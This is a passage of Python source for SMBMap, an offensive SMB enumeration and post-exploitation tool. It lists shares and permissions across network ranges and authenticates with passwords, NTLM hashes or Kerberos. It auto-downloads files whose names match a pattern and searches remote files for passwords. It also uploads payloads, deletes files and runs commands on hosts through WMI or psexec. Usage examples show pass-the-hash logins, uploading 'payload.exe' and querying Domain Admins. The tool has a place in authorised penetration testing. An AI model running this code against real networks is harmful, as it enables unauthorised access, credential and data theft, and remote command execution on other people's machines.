                    #    print('\t{}\t{}\t{}'.format(share.ljust(50), share_name_privs, smb_tree[host][share]['comment'] ) )

                    if mysmb.csv and mysmb.recursive == False:
                        if ( mysmb.verbose == False and smb_tree[host][share]['privs'] != 'NO ACCESS') or mysmb.verbose == True:
                            row = {}
                            row['Host'] = host
                            row['Share'] = share
                            row['Privs'] = smb_tree[host][share]['privs'].replace(',','').replace(' ', '_')
                            row['Comment'] = smb_tree[host][share]['comment']
                            mysmb.writer.writerow(row)

                    if mysmb.grepable and len(smb_tree[host][share]['contents'].keys()) == 0:
                        mysmb.outfile.write('host:{}, share:{}, privs:{}\n'.format(host, share, smb_tree[host][share]['privs'].replace(',','').replace(' ', '_')))

                    if mysmb.recursive:
                        for path in smb_tree[host][share]['contents'].keys():
                            if mysmb.grepable == False and mysmb.csv == False and mysmb.verbose:
                                if len(path) > 0 and path[0] == '/':
                                    print('\t./{}/{}'.format(share, path))
                                else:
                                    print('\t./{}{}'.format(share, path))
                            for file_info in smb_tree[host][share]['contents'][path]:
                                isDir = file_info['isDir']
                                readonly = file_info['readonly']
                                filesize = file_info['filesize']
                                date = file_info['date']
                                filename = file_info['filename']
                                if mysmb.verbose and mysmb.grepable == False and mysmb.csv == False and ((mysmb.dir_only == True and isDir == 'd') or ( (isDir == 'f' or isDir == 'd') and mysmb.dir_only == False)):
                                    print('\t%s%s--%s--%s-- %s %s\t%s' % (isDir, readonly, readonly, readonly, str(filesize).rjust(16), date, filename))
                                if mysmb.grepable:
                                    if filename != '.' and filename != '..':
                                        if (mysmb.dir_only == True and isDir == 'd') or ( (isDir == 'f' or isDir == 'd') and mysmb.dir_only == False):
                                            mysmb.outfile.write('host:{}, share:{}, privs:{}, isDir:{}, path:{}/{}/{}, fileSize:{}, date:{}\n'.format(host, share, smb_tree[host][share]['privs'].replace(',','').replace(' ', '_'), isDir, share, path, filename, str(filesize), date))

                                elif mysmb.csv:
                                    if filename != '.' and filename != '..':
                                        if (mysmb.dir_only == True and isDir == 'd') or ( (isDir == 'f' or isDir == 'd') and mysmb.recursive ):
                                            row = {}
                                            row['Host'] = host
                                            row['Share'] = share
                                            row['Privs'] = smb_tree[host][share]['privs'].replace(',','').replace(' ', '_')
                                            row['isDir'] = isDir
                                            row['Path'] = '{}/{}/{}'.format(share, path, filename)
                                            row['fileSize'] = str(filesize)
                                            row['Date'] = date
                                            mysmb.writer.writerow(row)

            heads_up = False
    except Exception as e:
        print('[!] Bummer: ', e)

def get_shares( share_args ):
    # shares_args is a dict object with the following keys
    #
    # --Key--       --Description--
    #
    # smbconn       SMB connection object
    # host          IP address
    # write_check   determine if WRITE permissions are assisgned
    # exclude       list of shares to exclude, like ipc$
    #
    # Returns a dict objects:
    #   {ip_address : {share_name : {'privs': 'val', 'comment' : 'val'} } }
    #
    #   Example ThreadPool return set:
    #   [{'192.168.86.48': {
    #       'print$': {'privs': 'NO ACCESS', 'comment': 'Printer Drivers'},
    #       'HP_LaserJet_1020': {'privs': 'NO ACCESS', 'comment': ''} }
    #    },
    #    {'192.168.86.106': {
    #       'ADMIN$': {'privs': 'READ, WRITE', 'comment': 'Remote Admin'},
    #       'C': {'privs': 'READ ONLY', 'comment': ''},
    #       'C$': {'privs': 'READ, WRITE', 'comment': 'Default share'},
    #       'Users': {'privs': 'READ, WRITE', 'comment': ''}}
    #    } ]

    share_tree = {}
    if share_args['smbconn'].getDialect():
        try:
            shareList = share_args['smbconn'].listShares()
            shares = []
            for item in range(len(shareList)):
                shares.append( (shareList[item]['shi1_netname'][:-1], shareList[item]['shi1_remark'][:-1]) )

            share_privs = ''
            share_comment = ''
            host = share_args['host']
            share_tree[host] = {}
            for share in shares:
                if share[0].lower() not in share_args['exclude']:
                    share_name = share[0]
                    share_comment = share[1]
                    share_tree[host][share_name] = {}
                    canWrite = False
                    readonly = False
                    noaccess = False
                    if share_args['write_check']:
                        try:
                            root = PERM_DIR.replace('/','\\')
                            root = ntpath.normpath(root)
                            create_dir(share_args['smbconn'], share_name, root)
                            share_tree[host][share_name]['privs'] = 'READ, WRITE'
                            canWrite = True
                            try:
                                remove_dir(share_args['smbconn'], share_name, root)
                            except Exception as e:
                                print('[!] Unable to remove test directory at \\\\%s\\%s\\%s<file://%25s/%25s/%25s>, please remove manually' % (host, share_name, root))
                        except Exception as e:
                            exc_type, exc_obj, exc_tb = sys.exc_info()
                            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                            #print(exc_type, fname, exc_tb.tb_lineno)
                            sys.stdout.flush()

                        if canWrite == False:
                            try:
                                root = PERM_DIR.replace('/','\\')
                                root = '{}.txt'.format(ntpath.normpath(root))
                                create_file(share_args['smbconn'], share_name, root)
                                share_tree[host][share_name]['privs'] = 'READ, WRITE'
                                canWrite = True
                                try:
                                    remove_file(share_args['smbconn'], share_name, root)
                                except Exception as e:
                                    if 'STATUS_OBJECT_NAME_NOT_FOUND' in str(e):
                                        pass
                                    else:
                                        print('[!] Unable to remove test file at \\\\{}\\{}\\{}, please remove manually'.format(host, share_name, root))
                            except Exception as e:
                                exc_type, exc_obj, exc_tb = sys.exc_info()
                                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                                #print(exc_type, fname, exc_tb.tb_lineno)
                                sys.stdout.flush()

                    try:
                        if share_args['smbconn'].listPath(share_name, pathify('/')) and canWrite == False:
                            readonly = True
                            share_tree[host][share_name]['privs'] = 'READ ONLY'
                    except Exception as e:
                        noaccess = True
                        share_tree[host][share_name]['privs'] = 'NO ACCESS'
                    share_tree[host][share_name]['comment'] = share_comment

            return share_tree
        except SessionError as e:
            print('[!] Access denied on {}, no fun for you...'.format(share_args['host']))
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print('[!] Something weird happened on ({}) {} on line {}'.format(share_args['host'], e, exc_tb.tb_lineno))
            sys.stdout.flush()
    return {}

def list_path( list_args ):
    # list_args is a dict object with the following keys
    #
    # --Key--       --Description--
    #
    # smbconn       SMB connection object
    # share         share drive to list (ls)
    # path          path on drive to list
    # path_list     child path list (it's a recursive function)
    # depth         how many nodes deep to traverse the tree
    # pattern       pattern to match against file names
    # dir_only      list only directories, skip files


    pwd = pathify(list_args['path'])
    width = 16
    share = list_args['share']
    depth = list_args['depth']
    path = list_args['path']
    host = list_args['host']

    if list_args['path_list'] is None:
        list_args['path_list'] = {}
        path_list = { host : { share : {} } }
    else:
        path_list = list_args['path_list']

    global LIST_PATH_TIMEOUT
    if LIST_PATH_TIMEOUT and time.perf_counter() - LIST_PATH_START_TIME > LIST_PATH_TIMEOUT:
        print(f'[!] List path timeout at \\\\{host}\\{share}\\{pwd} Aborting...')
        return path_list

    try:

        raw_path_list = list_args['smbconn'].listPath(share, pwd)
        path_list[host][share][path] = []
        for item in raw_path_list:
            filesize = item.get_filesize()
            readonly = 'w' if item.is_readonly() > 0 else 'r'
            date = time.ctime(float(item.get_mtime_epoch()))
            isDir = 'd' if item.is_directory() > 0 else 'f'
            filename = item.get_longname()
            if isDir == 'f':
                if list_args['pattern']:
                    fileMatch = re.search(list_args['pattern'].lower(), filename.lower())
                    if fileMatch:
                        if len(path) > 0 and path[0] == '/':
                            dlThis = '{}{}/{}'.format(share, path, filename)
                        else:
                            dlThis = '{}/{}/{}'.format(share, path, filename)
                        #dlThis = dlThis.replace('/','\\')
                        print('[+] Match found! Downloading: {}'.format(dlThis))
                        download_file(list_args['smbconn'], dlThis)
            if (list_args['dir_only'] and isDir == 'd') or ( list_args['dir_only'] == False):
                path_list[host][share][path].append({'isDir': isDir, 'readonly': readonly, 'filesize': filesize, 'date': date, 'filename': filename})
        if int(depth) > 1:
            for smbItem in path_list[host][share][path]:
                try:
                    if smbItem['isDir'] == 'd' and smbItem['filename'] not in [ '.', '..']:
                        subPath = '{}/{}'.format(path, smbItem['filename'])
                        subPath = pathify(subPath)
                        raw_path_list  = list_args['smbconn'].listPath(share, subPath)
                        if len(raw_path_list) > 2 and '{}/{}'.format(path, smbItem['filename']) not in path_list[host][share].keys() and subPath.count('\\')-1 <= int(depth):
                            list_args['path'] = '{}/{}'.format(path, smbItem['filename'])
                            list_args['path_list'] = path_list
                            list_path( list_args )
                except SessionError as e:
                    continue

        return path_list
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print('[!] Something weird happened on ({}) {} on line {}'.format(host, e, exc_tb.tb_lineno))
        sys.stdout.flush()

def download_file(smbconn, path):
    path = path.replace('/','\\')
    path = ntpath.normpath(path)
    filename = path.split('\\')[-1]
    share = path.split('\\')[0]
    path = path.replace(share, '', 1)
    host = socket.gethostbyname(smbconn.getRemoteHost())

    try:
        output_path = ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share.replace('$',''), path.replace('\\','_'))))
        dlFile = smbconn.listPath(share, path)
        print('[+] Starting download: {}{} ({} bytes)'.format(share, path, dlFile[0].get_filesize()))
        with open(output_path, 'wb') as out:
            smbconn.getFile(share, path, out.write)
        print('[+] File output to: %s/%s' % (os.getcwd(), output_path))

    except SessionError as e:
        if 'STATUS_ACCESS_DENIED' in str(e):
            print('[!] Error retrieving file, access denied')
        elif 'STATUS_INVALID_PARAMETER' in str(e):
            print('[!] Error retrieving file, invalid path')
        elif 'STATUS_SHARING_VIOLATION' in str(e):
            print('[!] Error retrieving file %s, sharing violation' % (filename))
        elif 'STATUS_NO_SUCH_FILE' in str(e):
            print('[!] Error retrieving file, no such file')
        #os.remove(ntpath.basename('%s/%s' % (os.getcwd(), '%s-%s%s' % (host, share.replace('$',''), path.replace('\\','_')))))
    return '{}/{}'.format(os.getcwd(),output_path)

def create_file(smbconn, share, path):
    tid = smbconn.connectTree(share)
    fid = smbconn.createFile(tid, path, desiredAccess=FILE_SHARE_WRITE, shareMode=FILE_SHARE_DELETE)
    smbconn.closeFile(tid, fid)

def remove_file(smbconn, share, path):
    #path = self.pathify(path)
    smbconn.deleteFile(share, path)

def remove_dir(smbconn, share, path):
    #path = self.pathify(path)
    smbconn.deleteDirectory(share, path)

def pathify(path):
    root = ''
    root = ntpath.join(path,'*')
    root = root.replace('/','\\')
    root = root.replace('\\\\','\\')
    root = ntpath.normpath(root)
    return root

def login_kerberos(host):
    smbconn = None
    try:
        if host['port'] == 445:
            smbconn = SMBConnection(host['ip'], host['ip'], sess_port=host['port'], timeout=3)
        else:
            smbconn = SMBConnection('*SMBSERVER', host['host'], sess_port=host['port'], timeout=3)
    except Exception as e:
            print('[!] Connection error on {}'.format(host['ip']))

    if smbconn:
        try:
            smbconn.kerberosLogin(host['user'], host['passwd'], host['domain'], host['lmhash'], host['nthash'], kdcHost=host['kdc'], useCache=USE_CCACHE)
        except Exception as e:
            print('[!] Authentication error on {}'.format(host['ip']), e)

        return smbconn

    return False

def login(host):
    smbconn = None
    try:
        if host['port'] == 445:
            smbconn = SMBConnection(host['ip'], host['ip'], sess_port=host['port'], timeout=3)
        else:
            smbconn = SMBConnection('*SMBSERVER', host['host'], sess_port=host['port'], timeout=3)
    except Exception as e:
        print('[!] Connection error on {}'.format(host['ip']))

    if smbconn:
        try:
            smbconn.login(host['user'], host['passwd'], host['domain'], host['lmhash'], host['nthash'])
        except Exception as e:
            if VERBOSE:
                print('[!] Authentication error on {}'.format(host['ip']))
        return smbconn

    return False

def check_smb_signing(signing_args):
    ip = signing_args['host']
    my_smb = None

    #First try to negotiate a session with legacy SMB dialect
    try:
        my_smb = smb.SMB('.', ip)
    except Exception as e:
        pass

    #Then try to negotiate a session with SMB3 dialect
    if my_smb == None:
        try:
            my_smb = smb3.SMB3('.', ip)
        except Exception as e:
            pass

    if my_smb:
        try:
            if my_smb._Connection['RequireSigning'] == True:
                return { 'Host' : f'{ip:<16}', 'signing_status' : 'signing required' }
            elif isinstance(my_smb, smb3.SMB3) and my_smb._Connection['RequireSigning'] == False:
                return { 'Host' : f'{ip:<16}', 'signing_status' : 'signing enabled (not required)' }
        except AttributeError as e:
            pass

        try:
            if isinstance(my_smb, smb.SMB):
                if my_smb._dialects_parameters:
                    if my_smb._dialects_parameters.fields['SecurityMode'] == 7:
                        return { 'Host' : f'{ip:<16}', 'signing_status' : 'signing enabled (not required)' }
                    elif my_smb._dialects_parameters.fields['SecurityMode'] == 3:
                        return { 'Host' : f'{ip:<16}', 'signing_status' : 'signing disabled' }
        except Exception as e:
            pass
    return { 'Host' : f'{ip:<16}', 'signing_status' : 'unkown (possibly Linux)...' }

def main():
    example = 'Examples:\n\n'
    example += '$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1\n'
    example += '$ python smbmap.py -u jsmith -p \'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d\' -H 172.16.0.20\n'
    example += '$ python smbmap.py -u \'apadmin\' -p \'asdf1234!\' -d ACME -Hh 10.1.3.30 -x \'net group "Domain Admins" /domain\'\n'

    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, description=banner, epilog=example)

    sgroup = parser.add_argument_group("Main arguments")
    mex_group = sgroup.add_mutually_exclusive_group(required=True)
    pass_group = sgroup.add_mutually_exclusive_group()
    kerb_group = parser.add_argument_group('Kerberos settings')
    mex_group.add_argument("-H", metavar="HOST", dest='host', type=str, help="IP or FQDN", default=False)
    mex_group.add_argument("--host-file", metavar="FILE", dest="hostfile", default=False, type=argparse.FileType('r'), help="File containing a list of hosts")

    sgroup.add_argument("-u","--username", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
    pass_group.add_argument("-p", "--password", metavar="PASSWORD", dest='passwd', default='', help="Password or NTLM hash, format is LMHASH:NTHASH")
    pass_group.add_argument("--prompt", action='store_true', default=False, help="Prompt for a password")
    kerb_group.add_argument("-k", "--kerberos", action='store_true', dest='kerberos_auth', default=False, help="Use Kerberos authentication")
    kerb_group.add_argument("--no-pass", dest='no_pass', action='store_true', default=False, help="Use CCache file (export KRB5CCNAME='~/current.ccache')")
    kerb_group.add_argument("--dc-ip", metavar="IP or Host", dest='dc_ip', default=None, help="IP or FQDN of DC")
    sgroup.add_argument("-s", metavar="SHARE", dest='share', default='C$', help="Specify a share (default C$), ex 'C$'")
    sgroup.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
    sgroup.add_argument("-P", metavar="PORT", dest='port', type=int, default=445, help="SMB port (default 445)")
    sgroup.add_argument("-v","--version", dest='version', default=False, action='store_true', help="Return the OS version of the remote host")
    sgroup.add_argument("--signing", dest='signing', default=False, action='store_true', help="Check if host has SMB signing disabled, enabled, or required")
    sgroup.add_argument("--admin", dest='admin', default=False, action='store_true', help='Just report if the user is an admin')
    sgroup.add_argument("--no-banner", dest='nobanner', default=False, action='store_true', help='Removes the banner from the top of the output')
    sgroup.add_argument("--no-color", dest='nocolor', default=False, action='store_true', help='Removes the color from output')
    sgroup.add_argument("--no-update", dest='noupdate', default=False, action='store_true', help='Removes the "Working on it" message')
    sgroup.add_argument("--timeout", dest='scan_timeout', type=float, default=.5, help='Set port scan socket timeout. Default is .5 seconds')

    sgroup2 = parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")

    sgroup2.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command ex. 'ipconfig /all'")
    sgroup2.add_argument("--mode", metavar="CMDMODE", dest='mode', default='wmi', help="Set the execution method, wmi or psexec, default wmi", choices=['wmi','psexec'])

    sgroup3 = parser.add_argument_group("Shared drive Search", "Options for searching/enumerating the share of the specified host(s)")
    mex_group2 = sgroup3.add_mutually_exclusive_group()
    mex_group2.add_argument("-L", dest='list_drives', action="store_true", help="List all drives on the specified host, requires ADMIN rights.")
    mex_group2.add_argument("-r", metavar="PATH", dest="recursive_dir_list", nargs="?", const='/', help="Recursively list dirs and files (no share\\path lists the root of ALL shares), ex. 'email/backup'")
    sgroup3.add_argument('--list-dir-timeout', dest='recursive_dir_list_timeout', default=0, type=int, help='Specifcy a timeout (in seconds) before the recursive list dir and file terminates. Default is 0 (No timeout).')
    mex_group3 = sgroup3.add_mutually_exclusive_group()
    mex_group3.add_argument("-g", metavar="FILE", dest="grepable", default=False, help="Output to a file in a grep friendly format, used with -r (otherwise it outputs nothing), ex -g grep_out.txt")
    mex_group3.add_argument("--csv", metavar="FILE", dest="csv", default=False, help="Output to a CSV file, ex --csv shares.csv")
    sgroup3.add_argument("--dir-only", dest='dir_only', action='store_true', help="List only directories, ommit files.")
    sgroup3.add_argument("--no-write-check", dest='write_check', action='store_false', help="Skip check to see if drive grants WRITE access.")
    sgroup3.add_argument("-q", dest="verbose", default=True, action="store_false", help="Quiet verbose output. Only shows shares you have READ or WRITE on, and suppresses file listing when performing a search (-A).")
    sgroup3.add_argument("--depth", dest="depth", default=1, help="Traverse a directory tree to a specific depth. Default is 1 (root node).")
    sgroup3.add_argument("--exclude", metavar="SHARE", dest="exclude", nargs="+", const=None, help="Exclude share(s) from searching and listing, ex. --exclude ADMIN$ C$'")
    sgroup3.add_argument("-A", metavar="PATTERN", dest="pattern", help="Define a file name pattern (regex) that auto downloads a file on a match (requires -r), not case sensitive, ex '(web|global).(asax|config)'")

    sgroup4 = parser.add_argument_group("File Content Search", "Options for searching the content of files (must run as root), kind of experimental")
    sgroup4.add_argument("-F", dest="file_content_search", metavar="PATTERN", help="File content search, -F '[Pp]assword' (requires admin access to execute commands, and PowerShell on victim host)")
    sgroup4.add_argument("--search-path", dest="search_path", default="C:\\Users", metavar="PATH", help="Specify drive/path to search (used with -F, default C:\\Users), ex 'D:\\HR\\'")
    sgroup4.add_argument('--search-timeout', dest='search_timeout', default='300', metavar='TIMEOUT', help='Specifcy a timeout (in seconds) before the file search job gets killed. Default is 300 seconds.')

    sgroup5 = parser.add_argument_group("Filesystem interaction", "Options for interacting with the specified host's filesystem")
    sgroup5.add_argument("--download", dest='dlPath', metavar="PATH", help="Download a file from the remote system, ex.'C$\\temp\\passwords.txt'")
    sgroup5.add_argument("--upload", nargs=2, dest='upload', metavar=('SRC', 'DST'), help="Upload a file to the remote system ex. '/tmp/payload.exe C$\\temp\\payload.exe'")
    sgroup5.add_argument("--delete", dest="delFile", metavar="PATH TO FILE", help="Delete a remote file, ex. 'C$\\temp\\msf.exe'")
    sgroup5.add_argument("--skip", default=False, action="store_true", help="Skip delete file confirmation prompt")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    hosts_auth = []
    host_list = []
    mysmb = SMBMap()

    if not args.nobanner:
        print(banner)

    if args.nocolor:
        USE_TERMCOLOR=False
    if args.noupdate:
        global SEND_UPDATE_MSG
        SEND_UPDATE_MSG=False

    if args.prompt:
        args.passwd = getpass.getpass()

    if args.scan_timeout:
        if args.scan_timeout > 0 and args.scan_timeout < 10:
            PORT_SCAN_TIMEOUT = args.scan_timeout

    if isinstance(args.recursive_dir_list_timeout, int):
        global LIST_PATH_TIMEOUT
        LIST_PATH_TIMEOUT = args.recursive_dir_list_timeout

    lsshare = False
    lspath = False

    if args.grepable:
        mysmb.grepable = args.grepable
        mysmb.outfile = open(args.grepable, 'w')

    if args.csv:
        mysmb.csv = True
        mysmb.outfile = open(args.csv, 'w')
        if args.recursive_dir_list != None:
            csv_fields = ['Host', 'Share', 'Privs', 'isDir', 'Path', 'fileSize', 'Date']
        elif args.version:
            csv_fields = ['Host', 'Version', 'Name', 'Domain']
        elif args.signing:
            csv_fields = ['Host', 'signing_status']
        else:
            csv_fields = ['Host', 'Share', 'Privs', 'Comment']
        mysmb.writer = csv.DictWriter(mysmb.outfile, csv_fields)
        mysmb.writer.writeheader()

    if args.pattern:
        mysmb.pattern = args.pattern
        mysmb.verbose = False

    if args.verbose == False:
        mysmb.verbose = False

    if args.dir_only:
        mysmb.dir_only = True

    if args.recursive_dir_list != None:
        mysmb.recursive = True
        try:
            lspath = args.recursive_dir_list.split('/')
            lsshare = lspath[0]
            lspath = '/'.join(lspath[1:])
        except:
            lspath = '/'
            pass

    if args.exclude:
        for ex_share in args.exclude:
            mysmb.exclude.append(ex_share.lower())

    if args.hostfile:
        with args.hostfile as file:
            for host in file.readlines():
                host = host.strip()
                if host.find('/') > 0:
                    try:
                        host_list = [ str(ip) for ip in ipaddress.ip_network(host, False).hosts() ]
                    except Exception as e:
                        print(f'[!] Invalid CIDR or host {host}')
                else:
                    try:
                        if socket.gethostbyname(host):
                            host_list.append(host)
                    except socket.gaierror as e:
                        print(f'[!] Name or service not known ({host})')

    if args.host and not args.hostfile:
        if args.host.find('/') > 0:
            try:
                host_list = [ str(ip) for ip in ipaddress.ip_network(args.host, False).hosts() ]
            except Exception as e:
                print(f'[!] Invalid CIDR or host {args.host}')
                sys.exit(1)
        else:
            try:
                if socket.gethostbyname(args.host):
                    host_list.append(args.host)
            except socket.gaierror as e:
                print(f'[!] Name or service not known ({args.host})')
                sys.exit(1)

    mysmb.loader = Loader('Checking for open ports...')
    mysmb.loading = True
    mysmb.loader.start()
    if len(host_list) > 0:
        porty_time = Pool()
        host_list = porty_time.map(find_open_ports, host_list)
        print('[*]','Detected {} hosts serving SMB'.format(sum(im_open is not False for im_open in host_list)))
    else:
        mysmb.loader.terminate()
        print('[!] No valid hosts provided')
        sys.exit(1)

    if mysmb.is_ntlm(args.passwd):
        lmhash, nthash = args.passwd.split(':')
    else:
        lmhash, nthash = ('', '')

    if args.dc_ip:
        kdc_host = args.dc_ip
    else:
        kdc_host = ''

    if args.no_pass:
        global USE_CCACHE
        USE_CCACHE = True

    mysmb.loader.update('Initializing hosts...')
    if host_list:
        host_args = []
        for ip in host_list:
            if ip:
                host_args.append({ 'ip' : ip.strip(), 'port' : args.port, 'user' : args.user, 'passwd' : args.passwd, 'domain' : args.domain, 'lmhash' : lmhash, 'nthash' : nthash, 'smbconn' : [] ,'kdc_host' : kdc_host })
        init_hosts_pool = Pool()
        hosts_auth = init_hosts_pool.map(init_host, host_args)

    if args.admin:
        mysmb.admin_only = True

    mysmb.loader.update('Authenticating...')
    connections = []
    if args.kerberos_auth:
        login_worker = Pool()
        connections = login_worker.map(login_kerberos, hosts_auth)
    else:
        login_worker = Pool()
        connections = login_worker.map(login, hosts_auth)
    if len(connections) > 0:
        print('[*] Established {} SMB connections(s) and {} authenticated session(s)'.format(len( [ True for conn in connections if conn != False ]), len([ True for conn in connections if ( conn != False and conn.getSessionKey()) ])))
    mysmb.hosts = { value['ip']:value for value in hosts_auth }
    for conn in connections:
        if conn:
            mysmb.hosts[ socket.gethostbyname(conn.getRemoteHost()) ]['smbconn'].append(conn)

    counter = 0

    if args.file_content_search:
        smb_server = mysmb.start_smb_server()
        mysmb.loader.update('Doing RCE things...')
        for host in list(mysmb.hosts.keys()):
            if args.search_path[-1] == '\\':
                search_path = args.search_path[:-1]
            else:
                search_path = args.search_path
            try:
                if len(mysmb.hosts[host]['smbconn'][0].listPath('ADMIN$', '/*')) > 0:
                    mysmb.start_file_search(host, args.file_content_search, args.share, search_path)
                    counter += 1
            except Exception as e:
                pass
        print('[+] File search started on {} hosts in directory {}...this could take a while'.format(counter, search_path))
        mysmb.get_search_results(args.search_timeout)
        mysmb.loader.update('Cleaning up!')
        smb_server.stop()

    if not args.file_content_search:
        if not args.dlPath and not args.upload and not args.delFile and not args.list_drives and not args.command and not args.version and not args.signing:

            share_pool = Pool()
            share_args = [ { 'smbconn' : mysmb.hosts[host]['smbconn'][0] , 'host' : host, 'write_check' : args.write_check, 'exclude' : mysmb.exclude } for host in mysmb.hosts.keys() if len(mysmb.hosts[host]['smbconn']) > 0 ]
            mysmb.loader.update('Enumerating shares...')

            # this call returns an array of dict objects
            all_shares = share_pool.map(get_shares, share_args)

            smb_tree = {}
            all_paths_listed = []
            list_path_args = []
            if mysmb.recursive or mysmb.dir_only and all_shares:
                for host_shares in all_shares:
                    if len(host_shares.keys()) > 0:
                        host = [ host for host in host_shares.keys() ][0]
                    else:
                        continue
                    if len(host_shares[host].keys()) > 0:
                        mysmb.hosts[host]['smbconn'][0].close()
                        mysmb.hosts[host]['smbconn'].pop()
                        share_conns = login_worker.map(login, [ mysmb.hosts[host] for index in range(0,len(host_shares[host].keys())) ] )
                        mysmb.hosts[host]['smbconn'] = share_conns
                        for index, share_name in enumerate(host_shares[host].keys()):
                            if host_shares[host][share_name]['privs'] != 'NO ACCESS' and lsshare == '':
                                list_path_args.append({ 'smbconn' : mysmb.hosts[host]['smbconn'][index] , 'host' : host, 'share' : share_name, 'path' : lspath, 'path_list' : None, 'depth' : args.depth , 'dir_only' : mysmb.dir_only, 'pattern' : mysmb.pattern })
                            elif host_shares[host][share_name]['privs'] != 'NO ACCESS' and share_name.lower() == lsshare.lower():
                                list_path_args.append({ 'smbconn' : mysmb.hosts[host]['smbconn'][index] , 'host' : host, 'share' : share_name, 'path' : lspath, 'path_list' : None, 'depth' : args.depth , 'dir_only' : mysmb.dir_only, 'pattern' : mysmb.pattern })
                if args.pattern:
                    print('[*] Performing file name pattern match! ')
	
                global LIST_PATH_START_TIME
                LIST_PATH_START_TIME = time.perf_counter()
                list_path_pool = Pool()
                mysmb.loader.update('Traversing shares...')
                all_paths_listed = list_path_pool.map(list_path, list_path_args)
                prev_hoat = None

            for share_drives_list in all_shares:
                if isinstance(share_drives_list, dict) and len(share_drives_list) > 0:
                    host = [ host for host in share_drives_list.keys() ][0]
                    smb_tree[host] = {}
                    for share in share_drives_list[host]:
                        smb_tree[host][share] = share_drives_list[host][share]
                        smb_tree[host][share]['contents'] = {}

            for path_list in all_paths_listed:
                if path_list:
                    host = [ host for host in path_list.keys() ][0]
                    for share_drive_contents in path_list[host]:
                        if path_list[host][share_drive_contents]:
                            smb_tree[host][share_drive_contents]['contents'] = path_list[host][share_drive_contents]

            mysmb.loader.update('Finished!')
            mysmb.loader.pause()
            if mysmb.verbose or mysmb.csv or mysmb.grepable:
                to_string(smb_tree, mysmb)

        if args.version:
            mysmb.loader.update('Grabbing version info.')
            mysmb.loader.pause()
            version_args = [ { 'smbconn' : mysmb.hosts[host]['smbconn'][0] , 'host' : host } for host in mysmb.hosts.keys() if len(mysmb.hosts[host]['smbconn']) > 0 ]
            version_pool = Pool()
            versions = version_pool.map(get_version, version_args)
            for version_info in versions:
                print("[+] {:<16} is running {} (name:{}) (domain:{})".format(version_info['Host'], version_info['Version'], version_info['Name'], version_info['Domain']))
                if args.csv:
                    mysmb.writer.writerow(version_info)


        if args.signing:
            mysmb.loader.update('Checking for SMB signing.')
            signing_args = [ { 'smbconn' : mysmb.hosts[host]['smbconn'][0] , 'host' : host } for host in mysmb.hosts.keys() if len(mysmb.hosts[host]['smbconn']) > 0 ]
            signing_pool = Pool()
            signing = signing_pool.map(check_smb_signing, signing_args)
            mysmb.loader.pause()
            for signing_info in signing:
                print(f'[!] {signing_info["Host"]}\t{signing_info["signing_status"]}')
                if args.csv:
                    mysmb.writer.writerow(signing_info)

        if True in [ (isinstance(arg, str) | isinstance(arg, list)) for arg in (args.dlPath, args.upload, args.delFile, args.list_drives, args.command) ]:
            for host in list(mysmb.hosts.keys()):
                is_admin = False
                try:
                    if len(mysmb.hosts[host]['smbconn'][0].listPath('ADMIN$', pathify('/'))) > 0:
                        is_admin = True
                except Exception as e:
                    pass

                try:
                    if args.dlPath:
                        download_file(mysmb.hosts[host]['smbconn'][0], args.dlPath)

                    if args.upload:
                        mysmb.upload_file(host, args.upload[0], args.upload[1])

                    if args.delFile:
                        mysmb.delete_file(host, args.delFile)

                    if args.list_drives:
                        if is_admin:
                            mysmb.list_drives(host, args.share)

                    if args.command:
                        mysmb.loader.update('Executing {} command, hang tight...'.format(args.mode))
                        if is_admin:
                            cmd_output = mysmb.exec_command(host, args.share, args.command, False, mysmb.hosts[host]['name'], args.mode)
                            mysmb.loader.pause()
                            if cmd_output:
                                print('')
                                print('[*]', 'Host: ', host)
                                print('')
                                print(cmd_output)

                except Exception as e:
                    print('[!]', e)
                    sys.stdout.flush()
                    pass

        mysmb.loader.update('Closing connections..')
        mysmb.loader.resume()
        logoff_args = [ { 'smbconn' : mysmb.hosts[host]['smbconn'][0] , 'host' : host } for host in mysmb.hosts.keys() if len(mysmb.hosts[host]['smbconn']) > 0 ]
        logoff_pool = Pool()
        loggedoff = logoff_pool.map(close_smb_connection, logoff_args)
        mysmb.loader.pause()
        mysmb.kill_loader()
        print('[*]','Closed {} connections'.format(len(loggedoff)))

        if args.grepable or args.csv:
            print('[*]','Results output to: {}'.format(mysmb.outfile.name))
            mysmb.outfile.close()

    sys.exit()


if __name__ == "__main__":
    main()
